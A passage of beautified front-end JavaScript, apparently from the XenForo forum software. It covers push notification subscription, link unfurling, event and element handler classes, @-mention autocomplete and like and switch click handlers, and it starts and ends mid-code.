          if ("object" !== typeof b || null === b) console.error("Invalid message:", b);else if (a = b.type, b = b.payload, "string" !== typeof a || "" === a) console.error("Invalid message type:", a);else if ("object" !== typeof b || null === b) console.error("Invalid message payload:", b);else {
            var c = l[a];
            "undefined" === typeof c ? console.error("No handler available for message type:", a) : c(b);
          }
        }), a() && (d(h).on("beforeunload", b), d(k).on("click", ".js-skipPwaNavIndicator", c))));
      },
      isSupported: function () {
        return "serviceWorker" in navigator;
      },
      isRunning: a,
      inhibitNavigationIndicator: c,
      getRegistration: function () {
        return e;
      },
      sendMessage: f
    };
  }(), XF.Push = function () {
    function a(a, c) {
      XF.PWA.getRegistration().then(function () {
        b();
        a && a();
      }).catch(function () {
        c && c();
      });
    }
    function b() {
      XF.PWA.getRegistration().then(function (a) {
        return a.pushManager.getSubscription();
      }).then(function (a) {
        XF.Push.isSubscribed = null !== a;
        XF.Push.isSubscribed ? (d(k).trigger("push:init-subscribed"), XF.config.userId && f(a) ? XF.Push.updateUserSubscription(a, "update") : (a.unsubscribe(), XF.Push.updateUserSubscription(a, "unsubscribe"))) : d(k).trigger("push:init-unsubscribed");
      });
    }
    function c(a) {
      var b = "=".repeat((4 - a.length % 4) % 4);
      a = (a + b).replace(/\-/g, "+").replace(/_/g, "/");
      a = h.atob(a);
      b = new Uint8Array(a.length);
      for (var c = 0; c < a.length; ++c) b[c] = a.charCodeAt(c);
      return b;
    }
    function f(a) {
      a instanceof PushSubscription && (a = a.options.applicationServerKey);
      if ("string" === typeof a) return XF.config.pushAppServerKey === a;
      a.buffer && a.BYTES_PER_ELEMENT && (a = a.buffer);
      if (!(a instanceof ArrayBuffer)) throw Error("input must be an array buffer or convertable to it");
      var b = c(XF.config.pushAppServerKey).buffer,
        d = b.byteLength;
      if (d !== a.byteLength) return !1;
      b = new DataView(b);
      a = new DataView(a);
      for (var e = 0; e < d; e++) if (b.getUint8(e) !== a.getUint8(e)) return !1;
      return !0;
    }
    var e = null;
    return {
      isSubscribed: null,
      initialize: function () {
        XF.Push.isSupported() && (XF.config.skipPushNotificationSubscription || a());
      },
      registerWorker: a,
      getPushHistoryUserIds: function () {
        return XF.LocalStorage.getJson("push_history_user_ids") || {};
      },
      setPushHistoryUserIds: function (a) {
        XF.LocalStorage.setJson("push_history_user_ids", a || {});
      },
      hasUserPreviouslySubscribed: function (a) {
        return XF.Push.getPushHistoryUserIds().hasOwnProperty(a || XF.config.userId);
      },
      addUserToPushHistory: function (a) {
        var b = XF.Push.getPushHistoryUserIds();
        b[a || XF.config.userId] = !0;
        XF.Push.setPushHistoryUserIds(b);
      },
      removeUserFromPushHistory: function (a) {
        var b = XF.Push.getPushHistoryUserIds();
        delete b[a || XF.config.userId];
        XF.Push.setPushHistoryUserIds(b);
      },
      handleUnsubscribeAction: function (a, b) {
        XF.Push.isSubscribed && XF.PWA.getRegistration().then(function (a) {
          return a.pushManager.getSubscription();
        }).then(function (a) {
          if (a) return e = a, a.unsubscribe();
        }).catch(function (a) {
          console.error("Error unsubscribing", a);
          b && b();
        }).then(function () {
          e && XF.Push.updateUserSubscription(e, "unsubscribe");
          XF.Push.isSubscribed = !1;
          a && a();
        });
      },
      handleSubscribeAction: function (a, b, c) {
        XF.Push.isSubscribed || Notification.requestPermission().then(function (d) {
          if ("granted" !== d) console.error("Permission was not granted");else {
            var e = XF.Push.base64ToUint8(XF.config.pushAppServerKey);
            XF.PWA.getRegistration().then(function (d) {
              d.pushManager.subscribe({
                userVisibleOnly: !0,
                applicationServerKey: e
              }).then(function (c) {
                XF.Push.updateUserSubscription(c, "insert");
                XF.Push.isSubscribed = !0;
                c = {
                  body: XF.phrase("push_enable_notification_body"),
                  dir: XF.isRtl() ? "rtl" : "ltr"
                };
                XF.config.publicMetadataLogoUrl && (c.icon = XF.config.publicMetadataLogoUrl);
                XF.config.publicPushBadgeUrl && (c.badge = XF.config.publicPushBadgeUrl);
                a || d.showNotification(XF.phrase("push_enable_notification_title"), c);
                XF.config.userId && XF.Push.addUserToPushHistory();
                b && b();
              }).catch(function (a) {
                console.error("Failed to subscribe the user: ", a);
                c && c();
              });
            });
          }
        });
      },
      handleToggleAction: function (a, b, c, d) {
        XF.Push.isSubscribed ? XF.Push.handleUnsubscribeAction(a, b) : XF.Push.handleSubscribeAction(!1, c, d);
      },
      updateUserSubscription: function (a, b) {
        if ("update" !== b || !XF.Cookie.get("push_subscription_updated")) {
          var c = a.getKey("p256dh"),
            e = a.getKey("auth"),
            g = (PushManager.supportedContentEncodings || ["aesgcm"])[0];
          d.ajax({
            url: XF.canonicalizeUrl("index.php?misc/update-push-subscription"),
            type: "post",
            data: {
              endpoint: a.endpoint,
              key: c ? btoa(String.fromCharCode.apply(null, new Uint8Array(c))) : null,
              token: e ? btoa(String.fromCharCode.apply(null, new Uint8Array(e))) : null,
              encoding: g,
              unsubscribed: "unsubscribe" === b ? 1 : 0,
              _xfResponseType: "json",
              _xfToken: XF.config.csrf
            },
            cache: !1,
            dataType: "json",
            global: !1
          }).always(function () {
            "update" === b && XF.Cookie.set("push_subscription_updated", "1");
          });
        }
      },
      isSupported: function () {
        return XF.PWA.isSupported() && XF.config.enablePush && XF.config.pushAppServerKey && "PushManager" in h && "Notification" in h;
      },
      base64ToUint8: c,
      isExpectedServerKey: f
    };
  }(), XF.ExpandableContent = function () {
    function a(a) {
      d(a).find(".js-expandWatch:not(.is-expanded)").each(function () {
        var a = d(this),
          b = a.find(".js-expandContent")[0];
        if (b) {
          var e,
            g = 0,
            l = function () {
              var c = b.scrollHeight,
                d = b.offsetHeight;
              0 == c || 0 == d ? 2E3 < g || (e && (clearTimeout(e), g += 200), e = setTimeout(l, g)) : c > d + 1 ? a.addClass("is-expandable") : a.removeClass("is-expandable");
            };
          l();
          if (!a.data("expand-check-triggered") && (a.data("expand-check-triggered", !0), a.find("img").one("load", l), h.MutationObserver)) {
            var k,
              n = !0,
              x = function () {
                n = !1;
                l();
                setTimeout(function () {
                  n = !0;
                }, 100);
              };
            var r = new MutationObserver(function (b) {
              a.hasClass("is-expanded") ? r.disconnect() : n && (k && clearTimeout(k), k = setTimeout(x, 200));
            });
            r.observe(this, {
              attributes: !0,
              childList: !0,
              subtree: !0
            });
          }
        }
      });
    }
    return {
      watch: function () {
        d(k).on("click", ".js-expandLink", function (a) {
          d(a.target).closest(".js-expandWatch").addClassTransitioned("is-expanded", XF.layoutChange);
        });
        d(h).onPassive("resize", function () {
          a(k);
        });
        d(k).on("embed:loaded", function () {
          a(k);
        });
      },
      checkSizing: a
    };
  }(), XF.UnfurlLoader = function () {
    function a() {
      function d(a) {
        var b = null === g ? a : a.substring(g);
        var c = b.indexOf("\n");
        -1 !== c && (b = b.substring(0, c), g = null === g ? b.length : g + b.length, g++, XF.UnfurlLoader.handleResponse(JSON.parse(b)), g < a.length && d(a));
      }
      if (b.length && !c) {
        var g = null;
        c = !0;
        XF.ajax("post", XF.canonicalizeUrl("unfurl.php"), {
          result_ids: b
        }, function (a) {
          d(a);
        }, {
          skipDefault: !0,
          dataType: "text",
          xhrFields: {
            onprogress: function (a) {
              a = a.currentTarget.response;
              a.length && d(a);
            }
          }
        }).always(function () {
          b = [];
          c = !1;
          g = null;
          f && (b = f, f = [], c = !1, setTimeout(a, 0));
        });
      }
    }
    var b = [],
      c = !1,
      f = [];
    return {
      activateContainer: function (e) {
        e = d(e).find(".js-unfurl");
        e.length && (e.each(function () {
          var a = d(this);
          if (!1 === a.data("pending") || a.data("pending-seen")) return !0;
          a.data("pending-seen", !0);
          a = a.data("result-id");
          c ? f.push(a) : b.push(a);
        }), a());
      },
      unfurl: a,
      handleResponse: function (a) {
        var b = d('.js-unfurl[data-result-id="' + a.result_id + '"]');
        b.length && (a.success ? XF.setupHtmlInsert(a.html, function (a, c, d) {
          b.replaceWith(a);
        }) : (a = b.find(".js-unfurl-title a"), a.text(b.data("url")).addClass("bbCodePlainUnfurl").removeClass("fauxBlockLink-blockLink"), b.replaceWith(a)));
      }
    };
  }(), XF.Event = function () {
    var a = new XF.ClassMapper(),
      b = {},
      c = function (b, c, f) {
        b = d(b);
        var e = b.data("xf-" + c).split(" ") || [],
          g = b.data("xf-" + c + "-handlers") || {},
          l;
        for (l = 0; l < e.length; l++) {
          var h = e[l];
          if (h.length) {
            if (!g[h]) {
              var k = a.getObjectFromIdentifier(h);
              if (!k) {
                console.error("Could not find %s handler for %s", c, h);
                continue;
              }
              var v = b.data("xf-" + h) || {};
              g[h] = new k(b, v);
            }
            if (f && !1 === g[h]._onEvent(f)) break;
          }
        }
        b.data("xf-" + c + "-handlers", g);
        return g;
      },
      f = XF.create({
        initialized: !1,
        eventType: "click",
        eventNameSpace: null,
        $target: null,
        options: {},
        __construct: function (a, b) {
          this.$target = a;
          this.options = XF.applyDataOptions(this.options, a.data(), b);
          this.eventType = this.eventType.toLowerCase();
          if (!this.eventNameSpace) throw Error("Please provide an eventNameSpace for your extended " + this.eventType + " handler class");
          this._init();
        },
        _init: function () {
          var a = new d.Event("xf-" + this.eventType + ":before-init." + this.eventNameSpace),
            b = !1;
          this.$target.trigger(a, [this]);
          a.isDefaultPrevented() || (b = this.init(), this.$target.trigger("xf-" + this.eventType + ":after-init." + this.eventNameSpace, [this, b]));
          this.initialized = !0;
          return b;
        },
        _onEvent: function (a) {
          var b = new d.Event("xf-" + this.eventType + ":before-" + this.eventType + "." + this.eventNameSpace);
          this.$target.trigger(b, [this]);
          if (!b.isDefaultPrevented()) {
            if ("function" == typeof this[this.eventType]) b = this[this.eventType](a);else if ("function" == typeof this.onEvent) b = this.onEvent(a);else return console.error("You must provide a %1$s(e) method for your %1$s event handler", this.eventType, this.eventNameSpace), a.preventDefault(), !1;
            this.$target.trigger("xf-" + this.eventType + ":after-" + this.eventType + "." + this.eventNameSpace, [this, b, a]);
          }
          return null;
        },
        init: function () {
          console.error("This is the abstract init method for XF.%s, which must be overridden.", this.eventType, this.eventNameSpace);
        }
      });
    return {
      watch: function (a) {
        function e(a, b) {
          b || (b = a.currentTarget);
          if (!b || !b.getAttribute) return !1;
          b = d(b);
          return b.is("a") && !b.data("click-allow-modifier") && (a.ctrlKey || a.shiftKey || a.altKey || a.metaKey || 1 < a.which) || b.closest("[contenteditable=true]").length ? !1 : !0;
        }
        a = String(a).toLowerCase();
        b.hasOwnProperty(a) || (b[a] = !0, d(k).on(a, "[data-xf-" + a + "]", function (b) {
          var f = b.currentTarget;
          if (e(b, f)) {
            var g = d(f).data("xf-pointer-type");
            b.xfPointerType = b.pointerType || g || "";
            c(f, a, b);
          }
        }), d(k).on("pointerdown", "[data-xf-" + a + "]", function (a) {
          var b = a.currentTarget;
          e(a, b) && d(b).data("xf-pointer-type", a.pointerType);
        }));
      },
      initElement: c,
      getElementHandler: function (a, b, c) {
        var d = a.data("xf-" + c + "-handlers");
        d || (d = XF.Event.initElement(a[0], c));
        return d && d[b] ? d[b] : null;
      },
      register: function (b, c, d) {
        XF.Event.watch(b);
        a.add(c, d);
      },
      extend: function (b, c) {
        a.extend(b, c);
      },
      newHandler: function (a) {
        return XF.extend(f, a);
      },
      AbstractHandler: f
    };
  }(), XF.Click = function () {
    return {
      watch: function () {
        return XF.Event.watch("click");
      },
      initElement: function (a, b) {
        return XF.Event.initElement(a, "click", b);
      },
      getElementHandler: function (a, b) {
        return XF.Event.getElementHandler(a, b, "click");
      },
      register: function (a, b) {
        XF.Event.watch("click");
        return XF.Event.register("click", a, b);
      },
      extend: function (a, b) {
        return XF.Event.extend(a, b);
      },
      newHandler: function (a) {
        return XF.Event.newHandler(a);
      }
    };
  }(), XF.Element = function () {
    var a = new XF.ClassMapper(),
      b = function (b, c, d) {
        var e = b.data("xf-element-handlers") || {};
        if (e[c]) return e[c];
        var f = a.getObjectFromIdentifier(c);
        if (!f) return null;
        d = new f(b, d || {});
        e[c] = d;
        b.data("xf-element-handlers", e);
        d.init();
        return d;
      },
      c = function (a) {
        a instanceof d && (a = a[0]);
        if (a && a.getAttribute) {
          var c = a.getAttribute("data-xf-init");
          if (c) {
            c = c.split(" ");
            var e = c.length;
            a = d(a);
            for (var f, g = 0; g < e; g++) (f = c[g]) && b(a, f, a.data("xf-" + f));
          }
        }
      },
      f = function (a) {
        a = d(a);
        1 < a.length ? a.each(function () {
          f(this);
        }) : (a.is("[data-xf-init]") && c(a[0]), a.find("[data-xf-init]").each(function () {
          c(this);
        }));
      },
      e = XF.create({
        $target: null,
        options: {},
        __construct: function (a, b) {
          this.$target = a;
          this.options = XF.applyDataOptions(this.options, a.data(), b);
        },
        init: function () {
          console.error("This is the abstract init method for XF.Element, which should be overridden.");
        },
        getOption: function (a) {
          return this.options[a];
        }
      });
    return {
      register: function (b, c) {
        a.add(b, c);
      },
      extend: function (b, c) {
        a.extend(b, c);
      },
      initialize: f,
      initializeElement: c,
      applyHandler: b,
      getHandler: function (a, b) {
        var d = a.data("xf-element-handlers");
        void 0 === d && (c(a), d = a.data("xf-element-handlers"));
        return d && d[b] ? d[b] : null;
      },
      newHandler: function (a) {
        return XF.extend(e, a);
      },
      AbstractHandler: e
    };
  }(), XF.AutoCompleteResults = XF.create({
    selectedResult: 0,
    $results: !1,
    $scrollWatchers: null,
    resultsVisible: !1,
    resizeBound: !1,
    headerHtml: null,
    options: {},
    __construct: function (a) {
      this.options = d.extend({
        onInsert: null,
        clickAttacher: null,
        beforeInsert: null,
        insertMode: "text",
        displayTemplate: "{{{icon}}}{{{text}}}",
        wrapperClasses: ""
      }, a);
    },
    isVisible: function () {
      return this.resultsVisible;
    },
    hideResults: function () {
      this.resultsVisible = !1;
      this.$results && this.$results.hide();
      this.stopScrollWatching();
    },
    stopScrollWatching: function () {
      this.$scrollWatchers && (this.$scrollWatchers.off("scroll.autocomplete"), this.$scrollWatchers = null);
    },
    addHeader: function (a) {
      this.headerHtml = a;
    },
    showResults: function (a, b, c, f) {
      var e;
      if (b) {
        this.resultsVisible = !1;
        this.$results ? this.$results.hide().empty() : (this.$results = d("<ul />").css({
          position: "absolute",
          display: "none"
        }).addClass("autoCompleteList " + this.options.wrapperClasses).attr("role", "listbox").appendTo(k.body), XF.setRelativeZIndex(this.$results, c, 1));
        a = new RegExp("(" + XF.regexQuote(XF.htmlspecialchars(a)) + ")", "i");
        for (e in b) if (b.hasOwnProperty(e)) {
          var g = b[e];
          var l = d("<li />").css("cursor", "pointer").attr("unselectable", "on").attr("role", "option").mouseenter(XF.proxy(this, "resultMouseEnter"));
          this.options.clickAttacher ? this.options.clickAttacher(l, XF.proxy(this, "resultClick")) : l.click(XF.proxy(this, "resultClick"));
          var m = {
            icon: "",
            text: "",
            desc: ""
          };
          if ("string" == typeof g) {
            var n = g;
            m.text = XF.htmlspecialchars(g);
          } else if (n = g.text, m.text = XF.htmlspecialchars(g.text), "undefined" !== typeof g.desc && (m.desc = XF.htmlspecialchars(g.desc)), "undefined" !== typeof g.icon ? m.icon = d('<img class="autoCompleteList-icon" />').attr("src", XF.htmlspecialchars(g.icon)) : "undefined" !== typeof g.iconHtml && (m.icon = d('<span class="autoCompleteList-icon" />').html(g.iconHtml)), m.icon && (m.icon = m.icon[0].outerHTML), g.extraParams) {
            var x = g.extraParams,
              r;
            for (r in x) if (x.hasOwnProperty(r)) {
              var p = r.match(/Html$/),
                v = p ? r.replace(/Html$/, "") : r;
              p = p ? x[r] : XF.htmlspecialchars(x[r]);
              m[v] = p;
            }
          }
          l.data("insert-text", n);
          l.data("insert-html", g.html || "");
          m.text = m.text.replace(a, "<strong>$1</strong>");
          m.desc = m.desc.replace(a, "<strong>$1</strong>");
          l.html(Mustache.render(this.options.displayTemplate, m)).appendTo(this.$results);
        }
        if (this.$results.children().length) {
          this.selectResult(0, !0);
          this.headerHtml && (l = d("<li />").addClass("menu-header menu-header--small").attr("unselectable", "on").html(this.headerHtml), l.prependTo(this.$results));
          if (!this.resizeBound) d(h).onPassive("resize", XF.proxy(this, "hideResults"));
          this.$results.css({
            top: "",
            left: "",
            right: "",
            bottom: ""
          });
          var t = this.$results,
            A = function (a) {
              d.isFunction(a) && (a = a(t, c));
              if (!a) {
                var b = c.offset();
                a = {
                  top: b.top + c.outerHeight(),
                  left: b.left
                };
                XF.isRtl() && (a.right = d("html").width() - b.left - c.outerWidth(), a.left = "auto");
              }
              return a;
            };
          this.stopScrollWatching();
          (b = c.parents().filter(function () {
            switch (d(this).css("overflow-x")) {
              case "scroll":
              case "auto":
                return !0;
              default:
                return !1;
            }
          })) && b.length && (b.on("scroll.autocomplete", function () {
            t.css(A(f));
          }), this.$scrollWatchers = b);
          this.$results.css(A(f)).show();
          this.resultsVisible = !0;
        }
      } else this.hideResults();
    },
    resultClick: function (a) {
      a.stopPropagation();
      this.insertResult(this.getResultText(a.currentTarget), a.currentTarget, a);
      this.hideResults();
    },
    resultMouseEnter: function (a) {
      this.selectResult(d(a.currentTarget).index(), !0);
    },
    selectResult: function (a, b) {
      if (this.$results) {
        var c = this.selectedResult = b ? a : this.selectedResult + a;
        a = this.$results.children();
        a.each(function (a) {
          a == c ? d(this).addClass("is-selected") : d(this).removeClass("is-selected");
        });
        if (0 > c || c >= a.length) this.selectedResult = -1;
      }
    },
    insertSelectedResult: function (a) {
      var b,
        c = !1;
      if (!this.resultsVisible) return !1;
      0 <= this.selectedResult && (b = this.$results.children().get(this.selectedResult)) && (c = this.getResultText(b), this.options.beforeInsert && (c = this.options.beforeInsert(c, b)), this.insertResult(c, b, a), c = !0);
      this.hideResults();
      return c;
    },
    insertResult: function (a, b, c) {
      if (this.options.onInsert) this.options.onInsert(a, b, c);
    },
    getResultText: function (a) {
      switch (this.options.insertMode) {
        case "text":
          var b = d(a).data("insert-text");
          break;
        case "html":
          b = d(a).data("insert-html");
      }
      return b;
    }
  }), XF.AutoCompleter = XF.create({
    options: {
      url: null,
      method: "GET",
      idleWait: 200,
      minLength: 2,
      at: "@",
      keepAt: !0,
      insertMode: "text",
      displayTemplate: "{{{icon}}}{{{text}}}",
      beforeInsert: null
    },
    $input: null,
    ed: null,
    results: null,
    visible: !1,
    idleTimer: null,
    pendingQuery: "",
    __construct: function (a, b, c) {
      this.options = d.extend(!0, {}, this.options, b);
      this.$input = a;
      this.ed = c;
      this.options.url ? (("string" != typeof this.options.at || 1 < this.options.at.length) && console.error("The 'at' option should be a single character string."), this.init()) : console.error("No URL option passed in to XF.AutoCompleter.");
    },
    init: function () {
      var a = this,
        b = {
          onInsert: function (b) {
            a.insertResult(b);
          },
          beforeInsert: this.options.beforeInsert,
          insertMode: this.options.insertMode,
          displayTemplate: this.options.displayTemplate
        };
      this.ed && (b.clickAttacher = function (b, d) {
        a.ed.events.bindClick(b, b, d);
      });
      this.results = new XF.AutoCompleteResults(b);
      this.ed ? (this.ed.events.on("keydown", XF.proxy(this, "keydown"), !0), this.ed.events.on("keyup", XF.proxy(this, "keyup"), !0), this.ed.events.on("click blur", XF.proxy(this, "blur")), d(this.ed.$wp).onPassive("scroll", XF.proxy(this, "blur"))) : (this.$input.on("keydown", XF.proxy(this, "keydown")), this.$input.on("keyup", XF.proxy(this, "keyup")), this.$input.on("click blur", XF.proxy(this, "blur")), d(k).onPassive("scroll", XF.proxy(this, "blur")));
    },
    keydown: function (a) {
      if (this.visible) switch (a.which) {
        case 40:
          return this.results.selectResult(1), a.preventDefault(), !1;
        case 38:
          return this.results.selectResult(-1), a.preventDefault(), !1;
        case 27:
          return this.hide(), a.preventDefault(), !1;
        case 13:
          if (this.visible) return this.results.insertSelectedResult(a), a.preventDefault(), !1;
      }
    },
    keyup: function (a) {
      if (this.visible) switch (a.which) {
        case 40:
        case 38:
        case 13:
          return;
      }
      this.hide();
      this.idleTimer && clearTimeout(this.idleTimer);
      this.idleTimer = setTimeout(XF.proxy(this, "lookForMatch"), this.options.idleWait);
    },
    blur: function () {
      this.visible && setTimeout(XF.proxy(this, "hide"), 250);
    },
    lookForMatch: function () {
      var a = this.getCurrentMatchInfo();
      a ? this.foundMatch(a.query) : this.hide();
    },
    getCurrentMatchInfo: function () {
      if (this.ed) {
        var a = this.ed.selection.ranges(0);
        if (!a || !a.collapsed) return null;
        var b = a.endContainer;
        if (!b || 3 !== b.nodeType) return null;
        var c = b;
        b = b.nodeValue.substring(0, a.endOffset);
      } else {
        b = this.$input;
        b.autofocus();
        a = b.getSelection();
        if (!a || 1 >= a.end) return !1;
        b = b.val().substring(0, a.end);
      }
      var d = b.lastIndexOf(this.options.at);
      if (-1 === d) return null;
      if (0 === d || b.substr(d - 1, 1).match(/(\s|[\](,]|--)/)) {
        var e = b.substr(d + 1);
        if (!e.match(/\s/) || 15 >= e.length) return {
          text: b,
          textNode: c,
          start: d,
          query: e.replace(new RegExp(String.fromCharCode(160), "g"), " "),
          range: a
        };
      }
      return null;
    },
    foundMatch: function (a) {
      this.pendingQuery !== a && (this.pendingQuery = a, a.length >= this.options.minLength && "[" !== a.substr(0, 1) && this.getPendingQueryOptions());
    },
    getPendingQueryOptions: function () {
      XF.ajax(this.options.method, this.options.url, {
        q: this.pendingQuery
      }, XF.proxy(this, "handlePendingQueryOptions"), {
        global: !1,
        error: !1
      });
    },
    handlePendingQueryOptions: function (a) {
      var b = this.getCurrentMatchInfo();
      a.q && b && a.q === b.query && (a.results && a.results.length ? this.show(a.q, a.results) : this.hide());
    },
    insertResult: function (a) {
      this.hide();
      var b = this.getCurrentMatchInfo();
      if (b) {
        var c = b.start + 1,
          f = b.range;
        if (this.ed) {
          this.ed.selection.save();
          XF.EditorHelpers.focus(this.ed);
          f = b.textNode;
          var e = f.nodeValue,
            g = f.splitText(this.options.keepAt ? c : c - 1);
          g.textContent = e.substr(c + b.query.length);
          a = "html" === this.options.insertMode ? d.parseHTML(a + "\u00a0") : k.createTextNode(a + "\u00a0");
          d(g).before(a);
          f.parentNode.normalize();
          this.ed.selection.restore();
        } else g = this.$input, g.autofocus(), -1 !== c && (g.setSelection(b.start, f.end), g.replaceSelectedText((this.options.keepAt ? this.options.at : "") + a + " ", "collapseToEnd"));
      }
    },
    show: function (a, b) {
      var c = this.getCurrentMatchInfo(),
        f = this.$input,
        e = f.dimensions(),
        g = this;
      if (c) if (this.visible = !0, this.ed) {
        var l = c.range;
        this.results.showResults(a, b, f, function (a) {
          if (!l || !l.getBoundingClientRect) return a = l.startContainer, {
            top: (3 === a.nodeType ? d(a.parentNode) : d(a)).dimensions().bottom + 3,
            left: e.left + 5
          };
          var b = l.cloneRange();
          b.setStart(c.textNode, c.start);
          b.setEnd(c.textNode, c.start + 1);
          b = b.getBoundingClientRect();
          return g.getResultPositionForSelection(b.left, b.bottom, l.getBoundingClientRect().left, a, e);
        });
      } else this.results.showResults(a, b, f, function (a) {
        for (var b = d("<div />"), l = h.getComputedStyle(f[0]), m, p = "", v = 0; v < l.length; v++) m = l[v], p += m + ": " + l.getPropertyValue(m) + "; ";
        b[0].style.cssText = p;
        b.css({
          position: "absolute",
          height: "",
          width: f.outerWidth(),
          opacity: 0,
          top: 0,
          left: "-9999px"
        });
        b[0].textContent = f.val();
        b.appendTo(k.body);
        p = k.createRange();
        p.setStart(b[0].firstChild, c.start);
        p.setEnd(b[0].firstChild, c.start + 1);
        v = p.getBoundingClientRect();
        var t = b.dimensions();
        l = e.left + (v.left - t.left);
        m = e.top + (v.bottom - t.top);
        p.setStart(b[0].firstChild, c.start + 1 + c.query.length);
        p.setEnd(b[0].firstChild, c.start + 1 + c.query.length);
        v = p.getBoundingClientRect();
        p = e.left + (v.left - t.left);
        b.remove();
        return g.getResultPositionForSelection(l, m, p, a, e);
      });
    },
    getResultPositionForSelection: function (a, b, c, f, e) {
      f = f.width();
      b = b + d(h).scrollTop() + 3;
      a + f > e.right && (a = c - f);
      a < e.left && (a = e.left);
      return {
        top: b,
        left: a
      };
    },
    hide: function () {
      this.visible && (this.visible = !1, this.results.hideResults());
    }
  }), XF.pageDisplayTime = Date.now(), d(XF.onPageLoad), d(h).on("pageshow", function () {
    if (!XF.pageDisplayTime || Date.now() > XF.pageDisplayTime) XF.pageDisplayTime = Date.now();
  }));
}(window.jQuery, window, document);
var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.findInternal = function (c, g, e) {
  c instanceof String && (c = String(c));
  for (var h = c.length, a = 0; a < h; a++) {
    var b = c[a];
    if (g.call(e, b, a, c)) return {
      i: a,
      v: b
    };
  }
  return {
    i: -1,
    v: void 0
  };
};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
var WatchList = ['click', 'keydown'];
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (c, g, e) {
  c != Array.prototype && c != Object.prototype && (c[g] = e.value);
};
$jscomp.getGlobal = function (c) {
  return "undefined" != typeof window && window === c ? c : "undefined" != typeof global && null != global ? global : c;
};
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.polyfill = function (c, g, e, h) {
  if (g) {
    e = $jscomp.global;
    c = c.split(".");
    for (h = 0; h < c.length - 1; h++) {
      var a = c[h];
      a in e || (e[a] = {});
      e = e[a];
    }
    c = c[c.length - 1];
    h = e[c];
    g = g(h);
    g != h && null != g && $jscomp.defineProperty(e, c, {
      configurable: !0,
      writable: !0,
      value: g
    });
  }
};
$jscomp.polyfill("Array.prototype.find", function (c) {
  return c ? c : function (c, e) {
    return $jscomp.findInternal(this, c, e).v;
  };
}, "es6", "es3");
!function (c, g, e, h) {
  XF.AttributionClick = XF.Event.newHandler({
    eventType: "click",
    eventNameSpace: "XFAttributionClick",
    options: {
      contentSelector: null
    },
    init: function () {},
    click: function (a) {
      var b = this.options.contentSelector,
        d = c(b);
      d.length && (a.preventDefault(), XF.smoothScroll(d, b, XF.config.speed.normal));
    }
  });
  XF.LikeClick = XF.Event.newHandler({
    eventType: "click",
    eventNameSpace: "XFLikeClick",
    options: {
      likeList: null,
      container: null
    },
    processing: !1,
    container: null,
    init: function () {
      this.options.container && (this.$container = XF.findRelativeIf(this.options.container, this.$target));
    },
    click: function (a) {
      a.preventDefault();
      if (!this.processing) {
        this.processing = !0;
        a = this.$target.attr("href");
        var b = this;
        XF.ajax("POST", a, {}, XF.proxy(this, "handleAjax"), {
          skipDefaultSuccess: !0
        }).always(function () {
          setTimeout(function () {
            b.processing = !1;
          }, 250);
        });
      }
    },
    handleAjax: function (a) {
      var b = this.$target;
      b.trigger("xf-" + this.eventType + ":before-handleAjax." + this.eventNameSpace, [this, a]);
      a.addClass && b.addClass(a.addClass);
      a.removeClass && b.removeClass(a.removeClass);
      if (a.text) {
        var d = b.find(".label");
        d.length || (d = b);
        d.text(a.text);
      }
      a.hasOwnProperty("isLiked") && (b.toggleClass("is-liked", a.isLiked), this.$container && this.$container.toggleClass("is-liked", a.isLiked));
      var f = this.options.likeList ? XF.findRelativeIf(this.options.likeList, b) : c([]);
      "undefined" !== typeof a.html && f.length && (a.html.content ? XF.setupHtmlInsert(a.html, function (a, b) {
        f.html(a).addClassTransitioned("is-active");
      }) : f.removeClassTransitioned("is-active", function () {
        f.empty();
      }));
      b.trigger("xf-" + this.eventType + ":after-handleAjax." + this.eventNameSpace, [this, a]);
    }
  });
  XF.PreviewClick = XF.Event.newHandler({
    eventType: "click",
    eventNameSpace: "XFPreviewClick",
    options: {},
    init: function () {
      console.warn("XF.PreviewClick is disabled. Use the built in editor preview tab");
    },
    click: function (a) {
      a.preventDefault();
    }
  });
  XF.handleSwitchResponse = function (a, b, d) {
    if (b.switchKey) {
      var f = a.data("sk-" + b.switchKey),
        k = !1;
      if (f) {
        for (var e, g; e = f.match(/(\s*,)?\s*(addClass|removeClass|titleAttr):([^,]+)(,|$)/);) if (f = f.substring(e[0].length), g = c.trim(e[3]), g.length) switch (e[2]) {
          case "addClass":
            a.addClass(g);
            break;
          case "removeClass":
            a.removeClass(g);
            break;
          case "titleAttr":
            k = "sync" == g;
        }
        f = c.trim(f);
        f.length && !b.text && (b.text = f);
      }
    }
    b.addClass && a.addClass(b.addClass);
    b.removeClass && a.removeClass(b.removeClass);
    b.text && (f = a.find(a.data("label")), f.length || (f = a), f.text(b.text), k && a.attr("title", b.text).removeAttr("data-original-title").trigger("tooltip:refresh"));
    if (b.message) {
      var h = d && b.redirect;
      XF.flashMessage(b.message, h ? 1E3 : 3E3, function () {
        h && XF.redirect(b.redirect);
      });
    }
  };
  XF.ScrollToClick = XF.Event.newHandler({
    eventType: "click",
    eventNameSpace: "XFScrollToClick",
    options: {
      target: null,
      silent: !1,
      hash: null,
      speed: 300
    },
    $scroll: null,
    init: function () {
      var a,
        b = this.options.hash,
        d = this.$target.attr("href");
      this.options.target && (a = XF.findRelativeIf(this.options.target, this.$target));
      if (!a || !a.length) if (d && d.length && "#" == d.charAt(0)) a = c(d);else if (this.options.silent) return;
      if (a && a.length) {
        if (this.$scroll = a, !0 === b || "true" === b) a = a.attr("id"), this.options.hash = a && a.length ? a : null;else {
          if (!1 === b || "false" === b) this.options.hash = null;
        }
      } else console.error("No scroll target could be found");
    },
    click: function (a) {
      this.$scroll && (a.preventDefault(), XF.smoothScroll(this.$scroll, this.options.hash, this.options.speed));
    }
  });
  XF.SwitchClick = XF.Event.newHandler({
    eventType: "click",
    eventNameSpace: "XFSwitchClick",
    options: {
      redirect: !1,
      overlayOnHtml: !0,
      label: ".js-label"
    },
    processing: !1,
    overlay: null,
    init: function () {
      this.$target.data("label", this.options.label);
    },
    click: function (a) {
      a.preventDefault();
      if (!this.processing) {
        this.processing = !0;
        a = this.$target.attr("href");
        var b = this;
        XF.ajax("POST", a, {}, XF.proxy(this, "handleAjax"), {
          skipDefaultSuccess: !0
        }).always(function () {
          setTimeout(function () {
            b.processing = !1;
          }, 250);
        });
